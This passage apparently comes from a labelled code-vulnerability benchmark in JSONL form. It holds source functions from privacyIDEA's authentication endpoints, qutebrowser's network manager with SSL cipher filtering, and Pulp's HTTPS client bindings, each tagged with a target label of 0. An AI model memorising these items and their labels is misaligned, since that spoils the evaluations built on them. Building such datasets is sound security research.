The realm of the user, who tries to authenticate. If the\n        realm is omitted, the user is looked up in the default realm.\n    :param pass: The password, that consists of the OTP PIN and the OTP value.\n\n    :return: a json result with a boolean \"result\": true\n\n    **Example response** for a successful authentication:\n\n       .. sourcecode:: http\n\n           HTTP/1.1 200 OK\n           Content-Type: application/json\n\n            {\n              \"detail\": {\n                \"message\": \"matching 1 tokens\",\n                \"serial\": \"PISP0000AB00\",\n                \"type\": \"spass\"\n              },\n              \"id\": 1,\n              \"jsonrpc\": \"2.0\",\n              \"result\": {\n                \"status\": true,\n                \"value\": {\"attributes\": {\n                            \"username\": \"koelbel\",\n                            \"realm\": \"themis\",\n                            \"mobile\": null,\n                            \"phone\": null,\n                            \"myOwn\": \"/data/file/home/koelbel\",\n                            \"resolver\": \"themis\",\n                            \"surname\": \"K\u00f6lbel\",\n                            \"givenname\": \"Cornelius\",\n                            \"email\": null},\n                          \"auth\": true}\n              },\n              \"version\": \"privacyIDEA unknown\"\n            }\n\n    The response in value->attributes can contain additional attributes\n    (like \"myOwn\") which you can define in the LDAP resolver in the attribute\n    mapping.\n    \"\"\"\n    user = get_user_from_param(request.all_data)\n    password = getParam(request.all_data, \"pass\", required)\n    options = {\"g\": g,\n               \"clientip\": g.client_ip}\n    # Add all params to the options\n    for key, value in request.all_data.items():\n            if value and key not in [\"g\", \"clientip\"]:\n                options[key] = value\n\n    auth, details = check_user_pass(user, password, options=options)\n    ui = user.info\n    result_obj = {\"auth\": auth,\n                  \"attributes\": {}}\n    if return_saml_attributes():\n        if auth or return_saml_attributes_on_fail():\n            # privacyIDEA's own attribute map\n            result_obj[\"attributes\"] = {\"username\": ui.get(\"username\"),\n                                        \"realm\": user.realm,\n                                        \"resolver\": user.resolver,\n                                        \"email\": ui.get(\"email\"),\n                                        \"surname\": ui.get(\"surname\"),\n                                        \"givenname\": ui.get(\"givenname\"),\n                                        \"mobile\": ui.get(\"mobile\"),\n                                        \"phone\": ui.get(\"phone\")\n                                        }\n            # additional attributes\n            for k, v in ui.iteritems():\n                result_obj[\"attributes\"][k] = v\n\n    g.audit_object.log({\"info\": details.get(\"message\"),\n                        \"success\": auth,\n                        \"serial\": details.get(\"serial\"),\n                        \"tokentype\": details.get(\"type\"),\n                        \"user\": user.login,\n                        \"resolver\": user.resolver,\n                        \"realm\": user.realm})\n    return send_result(result_obj, details=details)\n\n\n@validate_blueprint.route('/triggerchallenge', methods=['POST', 'GET'])\n@admin_required\n@check_user_or_serial_in_request(request)\n@prepolicy(check_base_action, request, action=ACTION.TRIGGERCHALLENGE)\n@event(\"validate_triggerchallenge\", request, g)\ndef trigger_challenge():\n    \"\"\"\n    An administrator can call this endpoint if he has the right of\n    ``triggerchallenge`` (scope: admin).\n    He can pass a ``user`` name and or a ``serial`` number.\n    privacyIDEA will trigger challenges for all native challenges response\n    tokens, possessed by this user or only for the given serial number.\n\n    The request needs to contain a valid PI-Authorization header.\n\n    :param user: The loginname/username of the user, who tries to authenticate.\n    :param realm: The realm of the user, who tries to authenticate. If the\n        realm is omitted, the user is looked up in the default realm.\n    :param serial: The serial number of the token.\n\n    :return: a json result with a \"result\" of the number of matching\n        challenge response tokens\n\n    **Example response** for a successful triggering of challenge:\n\n       .. sourcecode:: http\n\n           {\"jsonrpc\": \"2.0\",\n            \"signature\": \"1939...146964\",\n            \"detail\": {\"transaction_ids\": [\"03921966357577766962\"],\n                       \"messages\": [\"Enter the OTP from the SMS:\"],\n                       \"threadid\": 140422378276608},\n            \"versionnumber\": \"unknown\",\n            \"version\": \"privacyIDEA unknown\",\n            \"result\": {\"status\": true,\n                       \"value\": 1},\n            \"time\": 1482223663.517212,\n            \"id\": 1}\n\n    **Example response** for response, if the user has no challenge token:\n\n       .. sourcecode:: http\n\n           {\"detail\": {\"messages\": [],\n                       \"threadid\": 140031212377856,\n                       \"transaction_ids\": []},\n            \"id\": 1,\n            \"jsonrpc\": \"2.0\",\n            \"result\": {\"status\": true,\n                       \"value\": 0},\n            \"signature\": \"205530282...54508\",\n            \"time\": 1484303812.346576,\n            \"version\": \"privacyIDEA 2.17\",\n            \"versionnumber\": \"2.17\"}\n\n    **Example response** for a failed triggering of a challenge. In this case\n        the ``status`` will be ``false``.\n\n       .. sourcecode:: http\n\n           {\"detail\": null,\n            \"id\": 1,\n            \"jsonrpc\": \"2.0\",\n            \"result\": {\"error\": {\"code\": 905,\n                                 \"message\": \"ERR905: The user can not be\n                                 found in any resolver in this realm!\"},\n                       \"status\": false},\n            \"signature\": \"14468...081555\",\n            \"time\": 1484303933.72481,\n            \"version\": \"privacyIDEA 2.17\"}\n\n    \"\"\"\n    user = request.User\n    serial = getParam(request.all_data, \"serial\")\n    result_obj = 0\n    details = {\"messages\": [],\n               \"transaction_ids\": []}\n    options = {\"g\": g,\n               \"clientip\": g.client_ip,\n               \"user\": user}\n\n    token_objs = get_tokens(serial=serial, user=user, active=True, revoked=False, locked=False)\n    for token_obj in token_objs:\n        if \"challenge\" in token_obj.mode:\n            # If this is a challenge response token, we create a challenge\n            success, return_message, transactionid, attributes = \\\n                token_obj.create_challenge(options=options)\n            if attributes:\n                details[\"attributes\"] = attributes\n            if success:\n                result_obj += 1\n                details.get(\"transaction_ids\").append(transactionid)\n                # This will write only the serial of the token that was processed last to the audit log\n                g.audit_object.log({\n                    \"serial\": token_obj.token.serial,\n                })\n            details.get(\"messages\").append(return_message)\n\n    g.audit_object.log({\n        \"user\": user.login,\n        \"resolver\": user.resolver,\n        \"realm\": user.realm,\n        \"success\": result_obj > 0,\n        \"info\": \"triggered {0!s} challenges\".format(result_obj),\n    })\n\n    return send_result(result_obj, details=details)\n\n", "target": 0}
{"idx": 977, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2014-2018 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Our own QNetworkAccessManager.\"\"\"\n\nimport collections\nimport html\n\nimport attr\nfrom PyQt5.QtCore import (pyqtSlot, pyqtSignal, QCoreApplication, QUrl,\n                          QByteArray)\nfrom PyQt5.QtNetwork import QNetworkAccessManager, QNetworkReply, QSslSocket\n\nfrom qutebrowser.config import config\nfrom qutebrowser.utils import (message, log, usertypes, utils, objreg,\n                               urlutils, debug)\nfrom qutebrowser.browser import shared\nfrom qutebrowser.browser.webkit import certificateerror\nfrom qutebrowser.browser.webkit.network import (webkitqutescheme, networkreply,\n                                                filescheme)\n\n\nHOSTBLOCK_ERROR_STRING = '%HOSTBLOCK%'\n_proxy_auth_cache = {}\n\n\n@attr.s(frozen=True)\nclass ProxyId:\n\n    \"\"\"Information identifying a proxy server.\"\"\"\n\n    type = attr.ib()\n    hostname = attr.ib()\n    port = attr.ib()\n\n\ndef _is_secure_cipher(cipher):\n    \"\"\"Check if a given SSL cipher (hopefully) isn't broken yet.\"\"\"\n    tokens = [e.upper() for e in cipher.name().split('-')]\n    if cipher.usedBits() < 128:\n        # https://codereview.qt-project.org/#/c/75943/\n        return False\n    # OpenSSL should already protect against this in a better way\n    elif cipher.keyExchangeMethod() == 'DH' and utils.is_windows:\n        # https://weakdh.org/\n        return False\n    elif cipher.encryptionMethod().upper().startswith('RC4'):\n        # http://en.wikipedia.org/wiki/RC4#Security\n        # https://codereview.qt-project.org/#/c/148906/\n        return False\n    elif cipher.encryptionMethod().upper().startswith('DES'):\n        # http://en.wikipedia.org/wiki/Data_Encryption_Standard#Security_and_cryptanalysis\n        return False\n    elif 'MD5' in tokens:\n        # http://www.win.tue.nl/hashclash/rogue-ca/\n        return False\n    # OpenSSL should already protect against this in a better way\n    # elif (('CBC3' in tokens or 'CBC' in tokens) and (cipher.protocol() not in\n    #         [QSsl.TlsV1_0, QSsl.TlsV1_1, QSsl.TlsV1_2])):\n    #     # http://en.wikipedia.org/wiki/POODLE\n    #     return False\n    ### These things should never happen as those are already filtered out by\n    ### either the SSL libraries or Qt - but let's be sure.\n    elif cipher.authenticationMethod() in ['aNULL', 'NULL']:\n        # Ciphers without authentication.\n        return False\n    elif cipher.encryptionMethod() in ['eNULL', 'NULL']:\n        # Ciphers without encryption.\n        return False\n    elif 'EXP' in tokens or 'EXPORT' in tokens:\n        # Weak export-grade ciphers\n        return False\n    elif 'ADH' in tokens:\n        # No MITM protection\n        return False\n    ### This *should* happen ;)\n    else:\n        return True\n\n\ndef init():\n    \"\"\"Disable insecure SSL ciphers on old Qt versions.\"\"\"\n    default_ciphers = QSslSocket.defaultCiphers()\n    log.init.debug(\"Default Qt ciphers: {}\".format(\n        ', '.join(c.name() for c in default_ciphers)))\n\n    good_ciphers = []\n    bad_ciphers = []\n    for cipher in default_ciphers:\n        if _is_secure_cipher(cipher):\n            good_ciphers.append(cipher)\n        else:\n            bad_ciphers.append(cipher)\n\n    log.init.debug(\"Disabling bad ciphers: {}\".format(\n        ', '.join(c.name() for c in bad_ciphers)))\n    QSslSocket.setDefaultCiphers(good_ciphers)\n\n\nclass NetworkManager(QNetworkAccessManager):\n\n    \"\"\"Our own QNetworkAccessManager.\n\n    Attributes:\n        adopted_downloads: If downloads are running with this QNAM but the\n                           associated tab gets closed already, the NAM gets\n                           reparented to the DownloadManager. This counts the\n                           still running downloads, so the QNAM can clean\n                           itself up when this reaches zero again.\n        _scheme_handlers: A dictionary (scheme -> handler) of supported custom\n                          schemes.\n        _win_id: The window ID this NetworkManager is associated with.\n                 (or None for generic network managers)\n        _tab_id: The tab ID this NetworkManager is associated with.\n                 (or None for generic network managers)\n        _rejected_ssl_errors: A {QUrl: [SslError]} dict of rejected errors.\n        _accepted_ssl_errors: A {QUrl: [SslError]} dict of accepted errors.\n        _private: Whether we're in private browsing mode.\n        netrc_used: Whether netrc authentication was performed.\n\n    Signals:\n        shutting_down: Emitted when the QNAM is shutting down.\n    \"\"\"\n\n    shutting_down = pyqtSignal()\n\n    def __init__(self, *, win_id, tab_id, private, parent=None):\n        log.init.debug(\"Initializing NetworkManager\")\n        with log.disable_qt_msghandler():\n            # WORKAROUND for a hang when a message is printed - See:\n            # http://www.riverbankcomputing.com/pipermail/pyqt/2014-November/035045.html\n            super().__init__(parent)\n        log.init.debug(\"NetworkManager init done\")\n        self.adopted_downloads = 0\n        self._args = objreg.get('args')\n        self._win_id = win_id\n        self._tab_id = tab_id\n        self._private = private\n        self._scheme_handlers = {\n            'qute': webkitqutescheme.handler,\n            'file': filescheme.handler,\n        }\n        self._set_cookiejar()\n        self._set_cache()\n        self.sslErrors.connect(self.on_ssl_errors)\n        self._rejected_ssl_errors = collections.defaultdict(list)\n        self._accepted_ssl_errors = collections.defaultdict(list)\n        self.authenticationRequired.connect(self.on_authentication_required)\n        self.proxyAuthenticationRequired.connect(\n            self.on_proxy_authentication_required)\n        self.netrc_used = False\n\n    def _set_cookiejar(self):\n        \"\"\"Set the cookie jar of the NetworkManager correctly.\"\"\"\n        if self._private:\n            cookie_jar = objreg.get('ram-cookie-jar')\n        else:\n            cookie_jar = objreg.get('cookie-jar')\n\n        # We have a shared cookie jar - we restore its parent so we don't\n        # take ownership of it.\n        self.setCookieJar(cookie_jar)\n        app = QCoreApplication.instance()\n        cookie_jar.setParent(app)\n\n    def _set_cache(self):\n        \"\"\"Set the cache of the NetworkManager correctly.\"\"\"\n        if self._private:\n            return\n        # We have a shared cache - we restore its parent so we don't take\n        # ownership of it.\n        app = QCoreApplication.instance()\n        cache = objreg.get('cache')\n        self.setCache(cache)\n        cache.setParent(app)\n\n    def _get_abort_signals(self, owner=None):\n        \"\"\"Get a list of signals which should abort a question.\"\"\"\n        abort_on = [self.shutting_down]\n        if owner is not None:\n            abort_on.append(owner.destroyed)\n        # This might be a generic network manager, e.g. one belonging to a\n        # DownloadManager. In this case, just skip the webview thing.\n        if self._tab_id is not None:\n            assert self._win_id is not None\n            tab = objreg.get('tab', scope='tab', window=self._win_id,\n                             tab=self._tab_id)\n            abort_on.append(tab.load_started)\n        return abort_on\n\n    def shutdown(self):\n        \"\"\"Abort all running requests.\"\"\"\n        self.setNetworkAccessible(QNetworkAccessManager.NotAccessible)\n        self.shutting_down.emit()\n\n    # No @pyqtSlot here, see\n    # https://github.com/qutebrowser/qutebrowser/issues/2213\n    def on_ssl_errors(self, reply, errors):  # noqa: C901 pragma: no mccabe\n        \"\"\"Decide if SSL errors should be ignored or not.\n\n        This slot is called on SSL/TLS errors by the self.sslErrors signal.\n\n        Args:\n            reply: The QNetworkReply that is encountering the errors.\n            errors: A list of errors.\n        \"\"\"\n        errors = [certificateerror.CertificateErrorWrapper(e) for e in errors]\n        log.webview.debug(\"Certificate errors: {!r}\".format(\n            ' / '.join(str(err) for err in errors)))\n        try:\n            host_tpl = urlutils.host_tuple(reply.url())\n        except ValueError:\n            host_tpl = None\n            is_accepted = False\n            is_rejected = False\n        else:\n            is_accepted = set(errors).issubset(\n                self._accepted_ssl_errors[host_tpl])\n            is_rejected = set(errors).issubset(\n                self._rejected_ssl_errors[host_tpl])\n\n        log.webview.debug(\"Already accepted: {} / \"\n                          \"rejected {}\".format(is_accepted, is_rejected))\n\n        if is_rejected:\n            return\n        elif is_accepted:\n            reply.ignoreSslErrors()\n            return\n\n        abort_on = self._get_abort_signals(reply)\n        ignore = shared.ignore_certificate_errors(reply.url(), errors,\n                                                  abort_on=abort_on)\n        if ignore:\n            reply.ignoreSslErrors()\n            err_dict = self._accepted_ssl_errors\n        else:\n            err_dict = self._rejected_ssl_errors\n        if host_tpl is not None:\n            err_dict[host_tpl] += errors\n\n    def clear_all_ssl_errors(self):\n        \"\"\"Clear all remembered SSL errors.\"\"\"\n        self._accepted_ssl_errors.clear()\n        self._rejected_ssl_errors.clear()\n\n    @pyqtSlot(QUrl)\n    def clear_rejected_ssl_errors(self, url):\n        \"\"\"Clear the rejected SSL errors on a reload.\n\n        Args:\n            url: The URL to remove.\n        \"\"\"\n        try:\n            del self._rejected_ssl_errors[url]\n        except KeyError:\n            pass\n\n    @pyqtSlot('QNetworkReply*', 'QAuthenticator*')\n    def on_authentication_required(self, reply, authenticator):\n        \"\"\"Called when a website needs authentication.\"\"\"\n        netrc_success = False\n        if not self.netrc_used:\n            self.netrc_used = True\n            netrc_success = shared.netrc_authentication(reply.url(),\n                                                        authenticator)\n        if not netrc_success:\n            abort_on = self._get_abort_signals(reply)\n            shared.authentication_required(reply.url(), authenticator,\n                                           abort_on=abort_on)\n\n    @pyqtSlot('QNetworkProxy', 'QAuthenticator*')\n    def on_proxy_authentication_required(self, proxy, authenticator):\n        \"\"\"Called when a proxy needs authentication.\"\"\"\n        proxy_id = ProxyId(proxy.type(), proxy.hostName(), proxy.port())\n        if proxy_id in _proxy_auth_cache:\n            user, password = _proxy_auth_cache[proxy_id]\n            authenticator.setUser(user)\n            authenticator.setPassword(password)\n        else:\n            msg = '<b>{}</b> says:<br/>{}'.format(\n                html.escape(proxy.hostName()),\n                html.escape(authenticator.realm()))\n            abort_on = self._get_abort_signals()\n            answer = message.ask(\n                title=\"Proxy authentication required\", text=msg,\n                mode=usertypes.PromptMode.user_pwd, abort_on=abort_on)\n            if answer is not None:\n                authenticator.setUser(answer.user)\n                authenticator.setPassword(answer.password)\n                _proxy_auth_cache[proxy_id] = answer\n\n    @pyqtSlot()\n    def on_adopted_download_destroyed(self):\n        \"\"\"Check if we can clean up if an adopted download was destroyed.\n\n        See the description for adopted_downloads for details.\n        \"\"\"\n        self.adopted_downloads -= 1\n        log.downloads.debug(\"Adopted download destroyed, {} left.\".format(\n            self.adopted_downloads))\n        assert self.adopted_downloads >= 0\n        if self.adopted_downloads == 0:\n            self.deleteLater()\n\n    @pyqtSlot(object)  # DownloadItem\n    def adopt_download(self, download):\n        \"\"\"Adopt a new DownloadItem.\"\"\"\n        self.adopted_downloads += 1\n        log.downloads.debug(\"Adopted download, {} adopted.\".format(\n            self.adopted_downloads))\n        download.destroyed.connect(self.on_adopted_download_destroyed)\n        download.adopt_download.connect(self.adopt_download)\n\n    def set_referer(self, req, current_url):\n        \"\"\"Set the referer header.\"\"\"\n        referer_header_conf = config.val.content.headers.referer\n\n        try:\n            if referer_header_conf == 'never':\n                # Note: using ''.encode('ascii') sends a header with no value,\n                # instead of no header at all\n                req.setRawHeader('Referer'.encode('ascii'), QByteArray())\n            elif (referer_header_conf == 'same-domain' and\n                  not urlutils.same_domain(req.url(), current_url)):\n                req.setRawHeader('Referer'.encode('ascii'), QByteArray())\n            # If refer_header_conf is set to 'always', we leave the header\n            # alone as QtWebKit did set it.\n        except urlutils.InvalidUrlError:\n            # req.url() or current_url can be invalid - this happens on\n            # https://www.playstation.com/ for example.\n            pass\n\n    # WORKAROUND for:\n    # http://www.riverbankcomputing.com/pipermail/pyqt/2014-September/034806.html\n    #\n    # By returning False, we provoke a TypeError because of a wrong return\n    # type, which does *not* trigger a segfault but invoke our return handler\n    # immediately.\n    @utils.prevent_exceptions(False)\n    def createRequest(self, op, req, outgoing_data):\n        \"\"\"Return a new QNetworkReply object.\n\n        Args:\n             op: Operation op\n             req: const QNetworkRequest & req\n             outgoing_data: QIODevice * outgoingData\n\n        Return:\n            A QNetworkReply.\n        \"\"\"\n        proxy_factory = objreg.get('proxy-factory', None)\n        if proxy_factory is not None:\n            proxy_error = proxy_factory.get_error()\n            if proxy_error is not None:\n                return networkreply.ErrorNetworkReply(\n                    req, proxy_error, QNetworkReply.UnknownProxyError,\n                    self)\n\n        for header, value in shared.custom_headers(url=req.url()):\n            req.setRawHeader(header, value)\n\n        host_blocker = objreg.get('host-blocker')\n        if host_blocker.is_blocked(req.url()):\n            log.webview.info(\"Request to {} blocked by host blocker.\".format(\n                req.url().host()))\n            return networkreply.ErrorNetworkReply(\n                req, HOSTBLOCK_ERROR_STRING, QNetworkReply.ContentAccessDenied,\n                self)\n\n        # There are some scenarios where we can't figure out current_url:\n        # - There's a generic NetworkManager, e.g. for downloads\n        # - The download was in a tab which is now closed.\n        current_url = QUrl()\n\n        if self._tab_id is not None:\n            assert self._win_id is not None\n            try:\n                tab = objreg.get('tab', scope='tab', window=self._win_id,\n                                 tab=self._tab_id)\n                current_url = tab.url()\n            except (KeyError, RuntimeError):\n                # https://github.com/qutebrowser/qutebrowser/issues/889\n                # Catching RuntimeError because we could be in the middle of\n                # the webpage shutdown here.\n                current_url = QUrl()\n\n        if 'log-requests' in self._args.debug_flags:\n            operation = debug.qenum_key(QNetworkAccessManager, op)\n            operation = operation.replace('Operation', '').upper()\n            log.webview.debug(\"{} {}, first-party {}\".format(\n                operation,\n                req.url().toDisplayString(),\n                current_url.toDisplayString()))\n\n        scheme = req.url().scheme()\n        if scheme in self._scheme_handlers:\n            result = self._scheme_handlers[scheme](req, op, current_url)\n            if result is not None:\n                result.setParent(self)\n                return result\n\n        self.set_referer(req, current_url)\n        return super().createRequest(op, req, outgoing_data)\n", "target": 0}
{"idx": 978, "func": "from types import NoneType\nimport base64\nimport locale\nimport logging\nimport os\nimport urllib\ntry:\n    import oauth2 as oauth\nexcept ImportError:\n    # python-oauth2 isn't available on RHEL 5.\n    oauth = None\n\nfrom M2Crypto import httpslib, m2, SSL\n\nfrom pulp.bindings import exceptions\nfrom pulp.bindings.responses import Response, Task\nfrom pulp.common.compat import json\nfrom pulp.common.constants import DEFAULT_CA_PATH\nfrom pulp.common.util import ensure_utf_8, encode_unicode\n\n\nclass PulpConnection(object):\n    \"\"\"\n    Stub for invoking methods against the Pulp server. By default, the\n    constructor will assemble the necessary server component configured with\n    the values provided. Instead of this behavior, the server_wrapper\n    parameter can be used to pass in another mechanism to make the actual\n    call to the server. The likely use of this is a duck-typed mock object\n    for unit testing purposes.\n    \"\"\"\n\n    def __init__(self,\n                 host,\n                 port=443,\n                 path_prefix='/pulp/api',\n                 timeout=120,\n                 logger=None,\n                 api_responses_logger=None,\n                 username=None,\n                 password=None,\n                 oauth_key=None,\n                 oauth_secret=None,\n                 oauth_user='admin',\n                 cert_filename=None,\n                 server_wrapper=None,\n                 verify_ssl=True,\n                 ca_path=DEFAULT_CA_PATH):\n\n        self.host = host\n        self.port = port\n        self.path_prefix = path_prefix\n        self.timeout = timeout\n\n        self.log = logger or logging.getLogger(__name__)\n        self.api_responses_logger = api_responses_logger\n\n        # Credentials\n        self.username = username\n        self.password = password\n        self.cert_filename = cert_filename\n        self.oauth_key = oauth_key\n        self.oauth_secret = oauth_secret\n        self.oauth_user = oauth_user\n\n        # Locale\n        default_locale = locale.getdefaultlocale()[0]\n        if default_locale:\n            default_locale = default_locale.lower().replace('_', '-')\n        else:\n            default_locale = 'en-us'\n\n        # Headers\n        self.headers = {'Accept': 'application/json',\n                        'Accept-Language': default_locale,\n                        'Content-Type': 'application/json'}\n\n        # Server Wrapper\n        if server_wrapper:\n            self.server_wrapper = server_wrapper\n        else:\n            self.server_wrapper = HTTPSServerWrapper(self)\n\n        # SSL validation settings\n        self.verify_ssl = verify_ssl\n        self.ca_path = ca_path\n\n    def DELETE(self, path, body=None, log_request_body=True):\n        return self._request('DELETE', path, body=body, log_request_body=log_request_body)\n\n    def GET(self, path, queries=()):\n        return self._request('GET', path, queries)\n\n    def HEAD(self, path):\n        return self._request('HEAD', path)\n\n    def POST(self, path, body=None, ensure_encoding=True, log_request_body=True):\n        return self._request('POST', path, body=body, ensure_encoding=ensure_encoding,\n                             log_request_body=log_request_body)\n\n    def PUT(self, path, body, ensure_encoding=True, log_request_body=True):\n        return self._request('PUT', path, body=body, ensure_encoding=ensure_encoding,\n                             log_request_body=log_request_body)\n\n    # protected request utilities ---------------------------------------------\n\n    def _request(self, method, path, queries=(), body=None, ensure_encoding=True,\n                 log_request_body=True):\n        \"\"\"\n        make a HTTP request to the pulp server and return the response\n\n        :param method:  name of an HTTP method such as GET, POST, PUT, HEAD\n                        or DELETE\n        :type  method:  basestring\n\n        :param path:    URL for this request\n        :type  path:    basestring\n\n        :param queries: mapping object or a sequence of 2-element tuples,\n                        in either case representing key-value pairs to be used\n                        as query parameters on the URL.\n        :type  queries: mapping object or sequence of 2-element tuples\n\n        :param body:    Data structure that will be JSON serialized and send as\n                        the request's body.\n        :type  body:    Anything that is JSON-serializable.\n\n        :param ensure_encoding: toggle proper string encoding for the body\n        :type ensure_encoding: bool\n\n        :param log_request_body: Toggle logging of the request body, defaults to true\n        :type log_request_body: bool\n\n        :return:    Response object\n        :rtype:     pulp.bindings.responses.Response\n\n        :raises:    ConnectionException or one of the RequestExceptions\n                    (depending on response codes) in case of unsuccessful\n                    request\n        \"\"\"\n        url = self._build_url(path, queries)\n        if ensure_encoding:\n            body = self._process_body(body)\n        if not isinstance(body, (NoneType, basestring)):\n            body = json.dumps(body)\n        self.log.debug('sending %s request to %s' % (method, url))\n\n        response_code, response_body = self.server_wrapper.request(method, url, body)\n\n        if self.api_responses_logger:\n            if log_request_body:\n                self.api_responses_logger.info(\n                    '%s request to %s with parameters %s' % (method, url, body))\n            else:\n                self.api_responses_logger.info(\n                    '%s request to %s' % (method, url))\n            self.api_responses_logger.info(\"Response status : %s \\n\" % response_code)\n            self.api_responses_logger.info(\n                \"Response body :\\n %s\\n\" % json.dumps(response_body, indent=2))\n\n        if response_code >= 300:\n            self._handle_exceptions(response_code, response_body)\n        elif response_code == 200 or response_code == 201:\n            body = response_body\n        elif response_code == 202:\n            if isinstance(response_body, list):\n                body = [Task(t) for t in response_body]\n            else:\n                body = Task(response_body)\n\n        return Response(response_code, body)\n\n    def _process_body(self, body):\n        \"\"\"\n        Process the request body, ensuring the proper encoding.\n        @param body: request body to process\n        @return: properly encoded request body\n        \"\"\"\n        if isinstance(body, (list, set, tuple)):\n            return [self._process_body(b) for b in body]\n        elif isinstance(body, dict):\n            return dict((self._process_body(k), self._process_body(v)) for k, v in body.items())\n        return ensure_utf_8(body)\n\n    def _handle_exceptions(self, response_code, response_body):\n\n        code_class_mappings = {400: exceptions.BadRequestException,\n                               401: exceptions.PermissionsException,\n                               404: exceptions.NotFoundException,\n                               409: exceptions.ConflictException}\n\n        if response_code not in code_class_mappings:\n\n            # Apache errors are simply strings as compared to Pulp's dicts,\n            # so differentiate based on that so we don't get a parse error\n\n            if isinstance(response_body, basestring):\n                raise exceptions.ApacheServerException(response_body)\n            else:\n                raise exceptions.PulpServerException(response_body)\n\n        else:\n            raise code_class_mappings[response_code](response_body)\n\n    def _build_url(self, path, queries=()):\n        \"\"\"\n        Takes a relative path and query parameters, combines them with the\n        base path, and returns the result. Handles utf-8 encoding as necessary.\n\n        :param path:    relative path for this request, relative to\n                        self.base_prefix. NOTE: if this parameter starts with a\n                        leading '/', this method will strip it and treat it as\n                        relative. That is not a standards-compliant way to\n                        combine path segments, so be aware.\n        :type  path:    basestring\n\n        :param queries: mapping object or a sequence of 2-element tuples,\n                        in either case representing key-value pairs to be used\n                        as query parameters on the URL.\n        :type  queries: mapping object or sequence of 2-element tuples\n\n        :return:    path that is a composite of self.path_prefix, path, and\n                    queries. May be relative or absolute depending on the nature\n                    of self.path_prefix\n        \"\"\"\n        # build the request url from the path and queries dict or tuple\n        if not path.startswith(self.path_prefix):\n            if path.startswith('/'):\n                path = path[1:]\n            path = '/'.join((self.path_prefix, path))\n            # Check if path is ascii and uses appropriate characters,\n            # else convert to binary or unicode as necessary.\n        try:\n            path = urllib.quote(str(path))\n        except UnicodeEncodeError:\n            path = urllib.quote(path.encode('utf-8'))\n        except UnicodeDecodeError:\n            path = urllib.quote(path.decode('utf-8'))\n        queries = urllib.urlencode(queries)\n        if queries:\n            path = '?'.join((path, queries))\n        return path\n\n\nclass HTTPSServerWrapper(object):\n    \"\"\"\n    Used by the PulpConnection class to make an invocation against the server.\n    This abstraction is used to simplify mocking. In this implementation, the\n    intricacies (read: ugliness) of invoking and getting the response from\n    the HTTPConnection class are hidden in favor of a simpler API to mock.\n    \"\"\"\n\n    def __init__(self, pulp_connection):\n        \"\"\"\n        :param pulp_connection: A pulp connection object.\n        :type pulp_connection: PulpConnection\n        \"\"\"\n        self.pulp_connection = pulp_connection\n\n    def request(self, method, url, body):\n        \"\"\"\n        Make the request against the Pulp server, returning a tuple of (status_code, respose_body).\n        This method creates a new connection each time since HTTPSConnection has problems\n        reusing a connection for multiple calls (as claimed by a prior comment in this module).\n\n        :param method: The HTTP method to be used for the request (GET, POST, etc.)\n        :type  method: str\n        :param url:    The Pulp URL to make the request against\n        :type  url:    str\n        :param body:   The body to pass with the request\n        :type  body:   str\n        :return:       A 2-tuple of the status_code and response_body. status_code is the HTTP\n                       status code (200, 404, etc.). If the server's response is valid json,\n                       it will be parsed and response_body will be a dictionary. If not, it will be\n                       returned as a string.\n        :rtype:        tuple\n        \"\"\"\n        headers = dict(self.pulp_connection.headers)  # copy so we don't affect the calling method\n\n        # Despite the confusing name, 'sslv23' configures m2crypto to use any available protocol in\n        # the underlying openssl implementation.\n        ssl_context = SSL.Context('sslv23')\n        # This restricts the protocols we are willing to do by configuring m2 not to do SSLv2.0 or\n        # SSLv3.0. EL 5 does not have support for TLS > v1.0, so we have to leave support for\n        # TLSv1.0 enabled.\n        ssl_context.set_options(m2.SSL_OP_NO_SSLv2 | m2.SSL_OP_NO_SSLv3)\n\n        if self.pulp_connection.verify_ssl:\n            ssl_context.set_verify(SSL.verify_peer, depth=100)\n            # We need to stat the ca_path to see if it exists (error if it doesn't), and if so\n            # whether it is a file or a directory. m2crypto has different directives depending on\n            # which type it is.\n            if os.path.isfile(self.pulp_connection.ca_path):\n                ssl_context.load_verify_locations(cafile=self.pulp_connection.ca_path)\n            elif os.path.isdir(self.pulp_connection.ca_path):\n                ssl_context.load_verify_locations(capath=self.pulp_connection.ca_path)\n            else:\n                # If it's not a file and it's not a directory, it's not a valid setting\n                raise exceptions.MissingCAPathException(self.pulp_connection.ca_path)\n        ssl_context.set_session_timeout(self.pulp_connection.timeout)\n\n        if self.pulp_connection.username and self.pulp_connection.password:\n            raw = ':'.join((self.pulp_connection.username, self.pulp_connection.password))\n            encoded = base64.encodestring(raw)[:-1]\n            headers['Authorization'] = 'Basic ' + encoded\n        elif self.pulp_connection.cert_filename:\n            ssl_context.load_cert(self.pulp_connection.cert_filename)\n\n        # oauth configuration. This block is only True if oauth is not None, so it won't run on RHEL\n        # 5.\n        if self.pulp_connection.oauth_key and self.pulp_connection.oauth_secret and oauth:\n            oauth_consumer = oauth.Consumer(\n                self.pulp_connection.oauth_key,\n                self.pulp_connection.oauth_secret)\n            oauth_request = oauth.Request.from_consumer_and_token(\n                oauth_consumer,\n                http_method=method,\n                http_url='https://%s:%d%s' % (self.pulp_connection.host, self.pulp_connection.port,\n                                              url))\n            oauth_request.sign_request(oauth.SignatureMethod_HMAC_SHA1(), oauth_consumer, None)\n            oauth_header = oauth_request.to_header()\n            # unicode header values causes m2crypto to do odd things.\n            for k, v in oauth_header.items():\n                oauth_header[k] = encode_unicode(v)\n            headers.update(oauth_header)\n            headers['pulp-user'] = self.pulp_connection.oauth_user\n\n        connection = httpslib.HTTPSConnection(\n            self.pulp_connection.host, self.pulp_connection.port, ssl_context=ssl_context)\n\n        try:\n            # Request against the server\n            connection.request(method, url, body=body, headers=headers)\n            response = connection.getresponse()\n        except SSL.SSLError, err:\n            # Translate stale login certificate to an auth exception\n            if 'sslv3 alert certificate expired' == str(err):\n                raise exceptions.ClientCertificateExpiredException(\n                    